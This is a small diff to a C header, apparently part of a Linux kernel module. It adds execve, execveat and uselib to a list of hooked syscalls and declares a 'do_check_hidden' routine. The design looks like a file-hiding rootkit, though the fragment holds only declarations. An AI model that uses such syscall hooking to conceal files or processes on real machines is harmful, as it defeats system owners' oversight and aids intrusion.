@@ -9,7 +9,7 @@
 #define HOOKED_SYSCALLS                                                                          \
     read, pread64, write, sendfile, open, openat, openat2, creat, access, faccessat, faccessat2, \
         stat, lstat, newfstatat, statx, truncate, chdir, chroot, chmod, fchmodat, chown, lchown, \
-        fchownat, getdents, getdents64, kill
+        fchownat, uselib, execve, execveat, getdents, getdents64, kill
 
 #define P_SYSCALL_HOOKS p_syscall_hooks /* Variable name for the syscall hook array */
 #define P_ORIG_SYSFUNS  p_orig_sysfuns  /* Variable name for the original syscall functions array */
@@ -25,5 +25,8 @@ extern hook_t P_SYSCALL_HOOKS[];
 extern const signal_handler_t P_SIG_HANDLERS[];
 
 DECLARE_HOOK_HANDLERS(HOOKED_SYSCALLS)
+
+long do_check_hidden(const sysfun_t orig_func, struct pt_regs *const p_regs, const int i32_dfd,
+                     const char __user *const s_filename, const int i32_at_flags);
 
 #endif
